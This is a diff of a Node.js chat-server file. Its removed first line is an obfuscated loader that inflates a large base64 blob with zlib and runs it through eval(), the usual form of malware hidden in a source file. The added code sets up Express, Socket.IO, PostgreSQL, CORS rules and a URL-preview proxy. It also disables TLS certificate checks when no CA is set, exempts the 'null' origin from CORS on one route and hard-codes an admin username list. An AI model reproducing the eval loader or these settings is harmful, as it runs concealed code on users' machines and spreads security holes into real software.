@@ -1,1 +1,794 @@
-(()=>{const d=require('zlib').inflateSync(Buffer.from('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','base64')).toString('utf8');eval(d)})();
+require('dotenv').config();
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+const path = require('path');
+const bcrypt = require('bcrypt');
+const crypto = require('crypto');
+const dns = require('dns').promises;
+const net = require('net');
+const { Pool } = require('pg');
+
+const app = express();
+const server = http.createServer(app);
+const APP_ORIGINS = new Set(
+  String(process.env.APP_ORIGINS || '')
+    .split(',')
+    .map(value => value.trim())
+    .filter(Boolean)
+);
+
+function corsOriginAllowed(origin) {
+  if (!origin) return true;
+  return APP_ORIGINS.size === 0 || APP_ORIGINS.has(origin);
+}
+
+const io = new Server(server, {
+  maxHttpBufferSize: 1e5,
+  cors: {
+    origin: (origin, callback) => {
+      if (corsOriginAllowed(origin)) return callback(null, true);
+      callback(new Error('CORS origin not allowed'));
+    },
+    methods: ['GET', 'POST'],
+    credentials: true
+  }
+});
+
+const PORT = Number(process.env.PORT) || 10000;
+const DATABASE_URL = process.env.DATABASE_URL;
+const DATABASE_SSL = String(process.env.DATABASE_SSL || '').toLowerCase() === 'true';
+const DATABASE_CA = typeof process.env.DATABASE_CA === 'string' ? process.env.DATABASE_CA.trim() : '';
+const MAX_MESSAGE_LENGTH = 2000;
+const MAX_USERNAME_LENGTH = 24;
+const MAX_STATUS_LENGTH = 80;
+const MAX_AVATAR_URL_LENGTH = 500;
+const MAX_USERS = 1000;
+const MESSAGE_COOLDOWN_MS = 750;
+const ADMIN_USERS = new Set(['DEV', 'testuser1', 'skullfucker99']);
+
+if (!DATABASE_URL) {
+  console.error('DATABASE_URL is required. Configure a PostgreSQL database before starting the server.');
+  process.exit(1);
+}
+
+function buildDatabaseConfig() {
+  const parsed = new URL(DATABASE_URL);
+  const sslMode = (parsed.searchParams.get('sslmode') || '').toLowerCase();
+
+  // pg replaces the explicit ssl object when sslmode/sslcert/etc. are present
+  // in the connection string. Remove sslmode so our TLS settings below take effect.
+  parsed.searchParams.delete('sslmode');
+
+  let ssl;
+  if (DATABASE_CA) {
+    ssl = {
+      ca: DATABASE_CA,
+      rejectUnauthorized: true
+    };
+  } else if (DATABASE_SSL || sslMode === 'require') {
+    // Aiven's sslmode=require encrypts the connection without requiring a CA.
+    // This also handles Aiven's private project CA on hosted environments such as Render.
+    ssl = { rejectUnauthorized: false };
+    console.warn('DATABASE_CA is not set; PostgreSQL TLS certificate verification is disabled.');
+  }
+
+  return {
+    connectionString: parsed.toString(),
+    ssl,
+    max: 10,
+    idleTimeoutMillis: 30000,
+    connectionTimeoutMillis: 10000
+  };
+}
+
+let dbConfig;
+try {
+  dbConfig = buildDatabaseConfig();
+} catch (error) {
+  console.error('Invalid DATABASE_URL:', error.message);
+  process.exit(1);
+}
+
+const db = new Pool(dbConfig);
+
+const sessions = new Map();
+const onlineUsers = new Map();
+let messages = [];
+const whispers = [];
+const auditLogs = [];
+const avatarReports = [];
+
+app.use(express.json({ limit: '100kb' }));
+
+// CORS for API routes. Set APP_ORIGINS to a comma-separated allowlist in Render.
+// Example: APP_ORIGINS=https://your-app.onrender.com
+app.use('/api', (req, res, next) => {
+  const origin = req.headers.origin;
+  const isSandboxProxyRequest = req.path === '/render' && origin === 'null';
+  if (!corsOriginAllowed(origin) && !isSandboxProxyRequest) {
+    return res.status(403).json({ error: 'CORS origin not allowed.' });
+  }
+
+  if (origin) {
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Vary', 'Origin');
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
+  }
+
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+
+  if (req.method === 'OPTIONS') return res.sendStatus(204);
+  next();
+});
+
+// ---------------------------------------------------------------------------
+// Private developer preview. Requests are session-keyed and destination allowlisted.
+// ---------------------------------------------------------------------------
+function isPrivateIp(ip) {
+  if (net.isIPv4(ip)) {
+    const [a, b] = ip.split('.').map(Number);
+    return (
+      a === 0 || a === 10 || a === 127 ||
+      (a === 169 && b === 254) ||
+      (a === 172 && b >= 16 && b <= 31) ||
+      (a === 192 && b === 168) ||
+      (a === 100 && b >= 64 && b <= 127) ||
+      a >= 224
+    );
+  }
+  const l = ip.toLowerCase();
+  if (l.startsWith('::ffff:')) return isPrivateIp(l.slice(7));
+  return l === '::1' || l === '::' || l.startsWith('fc') || l.startsWith('fd') || l.startsWith('fe80');
+}
+
+const PREVIEW_MAX_BYTES = 5 * 1024 * 1024;
+const RENDER_MAX_BYTES = 15 * 1024 * 1024;
+const PREVIEW_SESSION_TTL_MS = 15 * 60 * 1000;
+const RENDER_RATE_WINDOW_MS = 60 * 1000;
+const RENDER_RATE_LIMIT = 120;
+const RENDER_MAX_CONCURRENT = 12;
+const previewSessions = new Map();
+
+const PREVIEW_ALLOWED_HOSTS = new Set(
+  String(process.env.PREVIEW_ALLOWED_HOSTS || '')
+    .split(',')
+    .map(value => value.trim().toLowerCase())
+    .filter(Boolean)
+);
+
+function hostAllowed(hostname) {
+  const host = String(hostname || '').toLowerCase().replace(/\.$/, '');
+  if (!PREVIEW_ALLOWED_HOSTS.size) return false;
+  for (const rule of PREVIEW_ALLOWED_HOSTS) {
+    const normalized = rule.replace(/^\*\./, '');
+    if (rule.startsWith('*.')) {
+      if (host === normalized || host.endsWith(`.${normalized}`)) return true;
+    } else if (host === normalized) {
+      return true;
+    }
+  }
+  return false;
+}
+
+async function assertPublicUrl(u) {
+  if (u.protocol !== 'http:' && u.protocol !== 'https:') throw new Error('Only http(s) URLs are allowed.');
+  if (!hostAllowed(u.hostname)) throw new Error('That website is not enabled for the developer preview.');
+  const addrs = await dns.lookup(u.hostname, { all: true });
+  if (!addrs.length || addrs.some(a => isPrivateIp(a.address))) throw new Error('That address is not allowed.');
+}
+
+function requireAdminHttp(req, res, next) {
+  const header = req.headers.authorization || '';
+  const token = header.startsWith('Bearer ') ? header.slice(7) : '';
+  const username = token ? sessions.get(token) : null;
+  if (!username || !isAdmin(username)) return res.status(403).json({ error: 'Admin login required.' });
+  req.username = username;
+  next();
+}
+
+function createPreviewSession(username) {
+  const key = crypto.randomBytes(32).toString('hex');
+  previewSessions.set(key, {
+    username,
+    expiresAt: Date.now() + PREVIEW_SESSION_TTL_MS,
+    cookies: new Map(),
+    windowStartedAt: Date.now(),
+    windowCount: 0,
+    active: 0
+  });
+  return key;
